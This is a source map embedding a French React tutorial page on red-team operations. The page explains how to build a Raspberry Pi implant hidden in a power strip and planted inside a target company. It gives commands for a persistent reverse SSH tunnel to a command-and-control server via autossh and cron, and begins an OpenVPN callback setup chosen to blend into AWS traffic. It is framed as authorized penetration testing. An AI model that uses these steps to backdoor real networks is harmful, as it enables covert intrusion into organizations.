Redteam;","map":{"version":3,"sources":["/mnt/c/Users/Nico/hackingfornoobs_frontend/src/components/Redteam.js"],"names":["React","HackThePlanet","Hide","Methodo","KaliRaspberry","Raspap","InstanceVPS","FirewallRules","AutologinProfile","RedteamUser","PublicIP","Radius01","Radius02","Redteam","Component"],"mappings":"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","sourcesContent":["import React from 'react';\r\nimport HackThePlanet from \"../img/hacktheplanet.gif\"\r\nimport Hide from \"../img/hide_raspberry.jpg\"\r\nimport Methodo from \"../img/methodo.jpg\"\r\nimport KaliRaspberry from \"../img/kali_raspberry.png\"\r\nimport Raspap from \"../img/raspap_01.png\"\r\nimport InstanceVPS from \"../img/instanceVPS.PNG\"\r\nimport FirewallRules from \"../img/regles_firewall.PNG\"\r\nimport AutologinProfile from \"../img/autologin_profil.png\"\r\nimport RedteamUser from \"../img/user_redteam.PNG\"\r\nimport PublicIP from \"../img/ip_publique.PNG\"\r\nimport Radius01 from \"../img/radius01.PNG\"\r\nimport Radius02 from \"../img/radius02.PNG\"\r\n\r\nclass Redteam extends React.Component {\r\n    render() {\r\n      return (\r\n      <div className=\"article\">\r\n\r\n        <h1>Redteam</h1>\r\n   \r\n        <hr/>\r\n        <p className=\"tabulation\">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent aujourd’hui passer des mois sur une seule et même cible, <strong>APT (Advanced Persitent Threat).</strong></p>\r\n\r\n        <p className=\"tabulation\">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans les locaux).</p>\r\n\r\n        <img id=\"hacktheplanet\" src={HackThePlanet} alt=\"hack the planet\"></img>\r\n\r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n\r\n        <h2>Contexte</h2>\r\n        <p className=\"tabulation\">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma suivant: <br/>\r\n\r\n        <img id=\"methodoredteam\" src={Methodo} alt=\"méthodologie redteam\"/>\r\n        <br/>  \r\n\r\n        Le scénario de la mission sera de pénétrer physiquement dans la société et d'y dissimuler notre backdoor pour obtenir un accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  \r\n\r\n        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaite avoir le contrôle total de nos outils. <br/><br/>\r\n        \r\n        Plusieurs méthodes se doivent d'être implémentées au cas où des règles de pare-feu bloqueraient certains flux sortants et une méthode alternative de connexion via Wifi ou GSM est également à envisager.\r\n        </p>\r\n\r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n\r\n        <h2>Cahier des charges de la box</h2>\r\n        <div>\r\n        Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:\r\n            <ul>\r\n                <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>\r\n                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et <strong>OpenVPN</strong></li>\r\n                <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>\r\n                <li>matériel <strong>rapide</strong></li>\r\n                <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>\r\n                <li>possibilité d'ajouter des modules éventuels</li>\r\n            </ul>\r\n        Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicité, et des autres critères, on préférera utiliser une <strong>Raspberry Pi.</strong></div>\r\n\r\n        <img id=\"kaliraspberry\" src={KaliRaspberry} alt=\"kali raspberry\"/>\r\n\r\n        <h2>Shopping list pour le matériel</h2>\r\n        <div>\r\n          <ul>\r\n            <li><a href=\"https://www.canakit.com/raspberry-pi-4-starter-kit.html\">Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100</a></li>\r\n            <li><a href=\"https://www.amazon.com/dp/B07FCMBLV6\">SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15</a></li>\r\n            <li><a href=\"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\">Raspberry Pi 4 Case with Fan - $10 (optional)</a></li>\r\n            <li><a href=\"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\">Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)</a></li>\r\n          </ul>\r\n        </div>\r\n\r\n        <br/>\r\n\r\n        <h2>Système d'exploitation</h2>\r\n        <p className=\"tabulation\">On retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous pentesters.</p>\r\n        \r\n        <br/>\r\n\r\n        <h2>Wifi</h2>\r\n        <p className=\"tabulation\">La Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure portée lors d'attaques sans fil.\r\n\r\n        Un adaptateur sans fil doté d'un <strong>chipset RT5370</strong> serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>\r\n        \r\n        <br/>\r\n\r\n        <h2>Comment dissimuler la Raspberry ?</h2>\r\n        <p>Une méthode efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>\r\n        <img id=\"hide_raspberry\" src={Hide} alt=\"idée pour chacher raspberry\"/>\r\n\r\n        <p>Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le câble réseau à la carte sans éveiller trop de soupçons de la part des employés</p>\r\n        \r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n\r\n        <h2>Configuration initiale</h2>\r\n        <div>\r\n          <ol>\r\n            <li>Installer l'image Kali pour la carte MicroSD</li>\r\n            <li>Configurer un point d'accès WiFi</li>\r\n            <li>Configurer un tunnel SSH inverse automatique</li>\r\n            <li>Configurer le client et le serveur OpenVPN</li>\r\n          </ol>\r\n        </div>\r\n        <h3>Installation de Kali Linux</h3>\r\n        <a href=\"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\">Kali Linux</a>\r\n\r\n        <br/>\r\n        <br/>\r\n\r\n        <div>\r\n          <h4>Pour Windows</h4>\r\n          Connectez la carte MicroSD à la machine Windows. <br/>\r\n          Décompressez l'archive.<br/>\r\n          Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>\r\n\r\n          <br/> \r\n\r\n          <h4>Pour Linux</h4>\r\n          Connectez la carte MicroSD au système Linux.<br/>\r\n          Utilisez la commande <strong>dd</strong> pour créer l'image du fichier Kali sur la carte MicroSD.<br/>\r\n\r\n          <br/>\r\n\r\n          <h4>Installation</h4>\r\n          Alimentez la Raspberry, connectez clavier/souris/écran et connectez-vous à Kali Linux avec le nom d'utilisateur \"root\" et le mot de passe \"toor\".<br/>\r\n          Veillez à connecter un câble Ethernet sur la Raspberry pour l'accès internet elle devrait alors récupérer automatiquement une adresse IP via DHCP.\r\n          \r\n        </div>\r\n\r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n        \r\n        <h3>Configurer un point d'accès Wifi</h3>\r\n\r\n        <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>\r\n\r\n        <div id=\"terminal\">yes | curl -sL https://install.raspap.com | bash</div>\r\n\r\n        <p>Après le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !<br/><br/>\r\n\r\n        Le <strong>DHCP</strong> distribue des adresses entre 10.3.141.50 et 10.3.141.255. Ainsi lorsqu’un appareil (PC, smartphone, tablette...) se connectera sur ce Wifi, une adresse IP comprise entre ces deux valeurs lui sera fournie.<br/><br/>\r\n\r\n        On accède à l’interface d’administration via une page web, en se connectant sur l’adresse IP : 10.3.141.1. On peut le faire en local sur la Raspberry Pi/AP ou depuis une autre machine connectée à l’AP.<br/><br/>\r\n\r\n        Les paramètres par défaut sont :</p>\r\n        <ul>\r\n          <li>Adresse IP : 10.3.141.1/24  et  169.254.218.244/16</li>\r\n          <li>Nom d’utilisateur : admin</li>\r\n          <li>Mot de passe : secret</li>\r\n          <li>Plage DHCP : 10.3.141.50-255</li>\r\n          <li>SSID : raspi-webgui</li>\r\n          <li>Mot de passe du SSID : ChangeMe</li>\r\n        </ul>\r\n\r\n        <img id=\"raspap\" src={Raspap} alt=\"raspap_AP\"/>\r\n\r\n        {/* Installation manuelle (sans raspap)\r\n        <div id=\"terminal\">apt-get install hostapd <br/>\r\n        apt-get install pciutils<br/>\r\n\r\n        nano /etc/network/interfaces<br/><br/>\r\n        ##Le fichier /etc/network/interfaces devrait ressembler à:<br/>\r\n\r\n        auto lo<br/>\r\n        iface lo inet loopback<br/>\r\n        auto eth0<br/>\r\n        iface eth0 inet dhcp<br/>\r\n        auto wlan0<br/>\r\n        allow-hotplug wlan0<br/>\r\n        iface wlan0 inet static<br/>\r\n        address 172.16.66.1<br/>\r\n        netmask 255.255.255.0<br/>\r\n        gateway 172.16.66.1<br/>\r\n        \r\n        <br/>\r\n\r\n        ##Install a DHCP server that will serve WiFi clients:<br/><br/>\r\n\r\n        apt-get install udhcpd<br/>\r\n\r\n        nano /etc/udhcpd.conf<br/><br/>\r\n        ##Add the following to the end of the file:<br/><br/>\r\n\r\n        start           172.16.66.50<br/>\r\n        end             172.16.66.70<br/>\r\n        interface       wlan0<br/>\r\n        # Optional<br/>\r\n        opt     dns     1.1.1.1<br/>\r\n        option  subnet  255.255.255.0<br/>\r\n        opt     router  172.16.66.1<br/>\r\n        option  domain  local<br/>\r\n        <br/>\r\n        ##Create a file for udhcpd.leases:<br/><br/>\r\n\r\n        touch /var/lib/misc/udhcpd.leases<br/>\r\n        ##Edit the /etc/default/udhcpd file <br/>and change the DHCPD_ENABLED=”no” to “yes”:<br/><br/>\r\n\r\n        DHCPD_ENABLED=”yes”<br/>\r\n        ##Create the file /etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/hostapd/hostapd.conf<br/>\r\n        ##Copy the following into the hostapd.conf file :<br/><br/>\r\n\r\n        # Interface configuration<br/>\r\n        interface=wlan0<br/>\r\n        ssid=iphone10<br/>\r\n        channel=6<br/><br/>\r\n\r\n        # WPA Configuration<br/>\r\n        macaddr_acl=0<br/>\r\n        auth_algs=1<br/>\r\n        ignore_broadcast_ssid=0<br/>\r\n        wpa=2<br/>\r\n        wpa_passphrase=SuperSecretSquirrel<br/>\r\n        wpa_key_mgmt=WPA-PSK<br/>\r\n        rsn_pairwise=CCMP<br/>\r\n\r\n        #Hardware Configuration<br/>\r\n        driver=nl80211<br/>\r\n        ieee80211n=1<br/>\r\n        hw_mode=g<br/>\r\n        wmm_enabled=1<br/><br/>\r\n\r\n\r\n        nano /etc/init.d/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=/etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/default/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"\r\n\r\n        update-rc.d hostapd enable\r\n        ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:<br/><br/>\r\n\r\n        sysctl -w net.ipv4.ip_forward=1<br/><br/>\r\n\r\n        nano /etc/sysctl.conf<br/>\r\n        [Remove the “#” in front of net.ipv4.ip_forward=1]<br/><br/>\r\n\r\n        Finally, use your IPTables-magic to masquerade client connections to the Internet:<br/><br/>\r\n\r\n        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br/>\r\n        There is a package available in Kali to make these changes to IPTables last.<br/><br/>\r\n\r\n        apt-get install iptables-persistent<br/>\r\n        iptables-save > /etc/iptables/rules.v4<br/><br/>\r\n        ##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:<br/><br/>\r\n\r\n        nano /etc/network/if-pre-up.d/iptables<br/>\r\n        Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:<br/><br/>\r\n\r\n        #!/bin/bash<br/>\r\n        /usr/sbin/iptables-restore {'<'} /etc/iptables/rules.v4<br/><br/>\r\n\r\n        chmod +x /etc/network/if-pre-up.d/iptables<br/>\r\n\r\n        reboot<br/>\r\n        ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.\r\n        </div> */}\r\n\r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n\r\n        <h3>Configurer un reverse shell automatique</h3>\r\n        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{\"&\"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^ <br/><strong>[Sur la Raspberry]</strong></p>   \r\n\r\n        <div id=\"terminal\">\r\n        apt install autossh <br/>\r\n        ssh-keygen (laisser les paramètres par défaut) \r\n        </div>\r\n\r\n        <div id=\"terminal\">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>\r\n\r\n        <strong>[Sur le serveur]</strong><br/>\r\n        Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>\r\n\r\n        <div id=\"terminal\">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>\r\n\r\n        <p><strong>[Sur la Raspberry]</strong><br/>\r\n        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure de connexion)</p>\r\n\r\n        <div id=\"terminal\">\r\n        vim /bin/autossh-connect.sh<br/>\r\n\r\n        #!/bin/bash<br/>\r\n        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] {\"&\"}</div>\r\n\r\n        -N: n'exécute pas de cmd sur la machine intermédiaire<br/>\r\n        -f: lancé en tache de fond<br/>\r\n        <br/>\r\n        <div id=\"terminal\">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>\r\n\r\n        <div id=\"terminal\">\r\n        crontab -e<br/>\r\n        \r\n        #Ajouter à la fin du fichier : <br/>\r\n\r\n        @reboot sleep 5 {\"&&\"} /bin/autossh-connect.sh > /dev/null 2>{\"&\"}1<br/>\r\n        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>{\"&\"}1<br/>\r\n        </div>\r\n        \r\n        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de commande et contrôle</p>\r\n        <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>\r\n\r\n        <div id=\"terminal\">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      \r\n        \r\n        <br/>\r\n        <hr/>\r\n        <br/>\r\n\r\n        <h3>Configurer une connexion OpenVPN</h3>\r\n        <p className=\"tabulation\">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.\r\n        </p>\r\n\r\n        <u>Cela se fait en 3 étapes :</u>\r\n\r\n        <ul>\r\n          <li>Configuration d'OpenVPN Access Server sur le net</li>\r\n          <li>Configuration de la Raspberry</li>\r\n          <li>Configuration de la machine d'attaque</li>\r\n        </ul>\r\n\r\n        <br/>\r\n\r\n        <h3>Mise en place OpenVPN Access Server</h3>\r\n        <p className=\"tabulation\">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/><br/>\r\n\r\n        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. Pour le POC je me suis crée un VPS perso sur Amazon.\r\n        </p>\r\n      \r\n        <ol>\r\n          <li>Allez sur <a href=\"https://aws.amazon.com/lightsail/\">Lien VPS amazon</a>, se connecter puis créer une nouvelle instance de VPS (OS 